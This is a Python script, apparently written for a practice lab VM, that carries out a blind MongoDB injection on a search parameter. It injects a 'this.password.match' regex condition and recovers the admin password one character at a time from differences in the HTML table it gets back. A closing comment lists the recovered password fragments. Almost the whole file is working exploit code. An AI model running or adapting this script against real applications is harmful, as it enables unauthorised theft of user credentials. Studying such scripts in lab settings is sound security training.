import requests
from bs4 import BeautifulSoup
import re

ip = '192.168.0.29'
letras = ""

#Buscar letras disponibles
for letra in range(127):
    r = requests.get(url = 'http://'+ip+'/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/'+chr(letra)+'/)//+%00')
    lenResult = len(BeautifulSoup(r.text,'lxml').findAll('table')[0].text.strip().split('\n'))
    if lenResult > 1:
        letras+=chr(letra)

letras = re.sub(r"[^a-zA-Z0-9]","",letras)

print("Disponibles: ",letras)

encontradas = []
passwd = ""
c=0
i=0

#probar todas las posibilidades
while c < len(letras):
    passwd = letras[c]
    i = 0
    while i < len(letras):
        r = requests.get(url = 'http://'+ip+'/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/'+passwd+letras[i]+'./)//+%00')
        lenResult = len(BeautifulSoup(r.text,'lxml').findAll('table')[0].text.strip().split('\n'))
        if lenResult > 1:
            passwd+=letras[i]
            print(passwd)
            i=0
        else:
            i+=1

    print(c,'=>',passwd)
    encontradas.append(passwd)
    c+=1
    
print(encontradas)

#determinar la ultima letra
c=0
while c < len(encontradas):
    i=0
    while i < len(letras):
        print(encontradas[c]+letras[i])
        r = requests.get(url = 'http://'+ip+'/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/'+encontradas[c]+letras[i]+'/)//+%00')
        lenResult = len(BeautifulSoup(r.text,'lxml').findAll('table')[0].text.strip().split('\n'))
        if lenResult > 1:
            encontradas[c] = encontradas[c]+letras[i]
            break
        i+=1
    c+=1

print(encontradas)

#['0rd', 'anhazpassw0rd', 'canhazpassw0rd', 'd', 'hazpassw0rd', 'icanhazpassw0rd', 'nhazpassw0rd', 'passw0rd', 'rd', 'ssw0rd', 'w0rd', 'zpassw0rd']

